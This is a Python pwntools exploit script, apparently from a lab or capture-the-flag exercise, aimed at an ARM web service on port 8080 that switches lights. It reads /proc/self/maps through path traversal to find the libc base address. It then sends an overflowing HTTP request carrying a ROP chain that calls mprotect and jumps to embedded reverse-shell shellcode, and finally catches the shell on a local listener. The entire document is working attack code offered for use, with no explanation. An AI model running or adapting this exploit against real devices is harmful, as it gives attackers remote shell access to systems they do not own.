#!/usr/bin/env python

from pwn import *

LHOST = [192,168,150,100]
LPORT = 4444
RHOST = '192.168.150.128'
RPORT = 8080
BAD_CHARS = '\x00\x20'

shellcode = '\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x01\x21\x48\x1c\x52\x40\xff\x27\x1a\x37\x01\xdf\x83\x46\x0c\xa1\x4a\x70\x10\x22\xff\x27\x1c\x37\x01\xdf\x58\x46\x49\x40\x31\x27\x0e\x37\x01\xdf\x58\x46\x01\x21\x01\xdf\x58\x46\x02\x21\x01\xdf\x05\xa0\x03\xa1\x52\x40\xc2\x71\x08\x60\x4a\x60\x0b\x27\x01\xdf\x02\x02'
shellcode += p16(LPORT, endian='big')
for c in LHOST:
    shellcode += chr(c)
shellcode += '/bin/shX'
for c in shellcode:
    assert(c not in BAD_CHARS)
open('sc', 'wb').write(shellcode)

libc_offset = 0x40000000
s = remote(RHOST, RPORT)
s.send('GET ../../../proc/self/maps HTTP/1.1\r\n\r\n')
while s.can_recv(1):
  line = s.recvline()
  if 'libc.so' in line and 'r-x' in line:
    libc_offset = int(line.split('-')[0], 16)
    info('Found libc offset at: 0x%x' % libc_offset)
    break
s.close()

pc = cyclic_find('uoaa')
info('PC offset: %d' % pc)

buf = 'S'*(pc-20)
buf += 'R4R4'
buf += 'R5R5'
buf += 'R6R6'
buf += 'R7R7'
buf += 'R8R8'

# Overwrite PC and LR with pop {pc}
buf += p32(libc_offset + 0x0002139c)    # pop {pc};

# r2 = 7
buf += p32(libc_offset + 0x000598b7)    # THUMB: pop {r0, pc};
buf += p32(0x07070707)
buf += p32(libc_offset + 0x000353ac)    # and r0, r0, #0xf; bx lr;
buf += p32(libc_offset + 0x000599f5)    # THUMB: str r0, [sp]; pop {r2, r3, r5, pc};
buf += 'r2r2'                           # will be overwritten by str r0, [sp]
buf += p32(libc_offset + 0x0002139c)    # r3 = pop {pc};
buf += 'r5r5'

# r0 = page-aligned stack addr; r9-r12 already point inside stack
buf += p32(libc_offset + 0x000437ac)    # add r1, sp, #7; mov r0, r4; blx r3;
buf += p32(libc_offset + 0x0004ace0)    # pop {r0, r4, lr}; bx lr;
buf += 'r0r0r4r4'
buf += p32(libc_offset + 0x0002139c)    # lr = pop {pc};
buf += p32(libc_offset + 0x00037c07)    # THUMB: movs r0, r1; blx lr;
buf += p32(libc_offset + 0x0005a447)    # THUMB: pop {r3, pc};
buf += p32(0xfffe1001)
buf += p32(libc_offset + 0x0002617c)    # pop {lr}; add sp, sp, #4; bx lr;
buf += p32(libc_offset + 0x0002139c)    # lr = pop {pc};
buf += 'AAAA'
buf += p32(libc_offset + 0x0002e390)    # add r0, r0, #1; bx lr;
buf += p32(libc_offset + 0x00024f28)    # and r0, r0, r3; bx lr;

# r1 = 0x10104010
buf += p32(libc_offset + 0x00058ee4)    # pop {r1, pc};
buf += p32(0x01010101)

# call mprotect
buf += p32(libc_offset + 0x30d8c)       # mprotect@libc.so; taken from mprotect.s on target system

# jump to shellcode
buf += p32(libc_offset + 0x00050c09)    # THUMB: blx sp;
buf += shellcode

for c in BAD_CHARS:
  if c in buf:
     warning('Found char %x in buffer at index %d' % (ord(c), buf.index(c)))

s = remote(RHOST, RPORT)
s.send('GET ' + buf + '/lights/on HTTP/1.1\r\n\r\nHost: XXXXXXXX\r\n\r\n')

nc = listen(LPORT)
nc.wait_for_connection()
nc.interactive()
s.close()
nc.close()
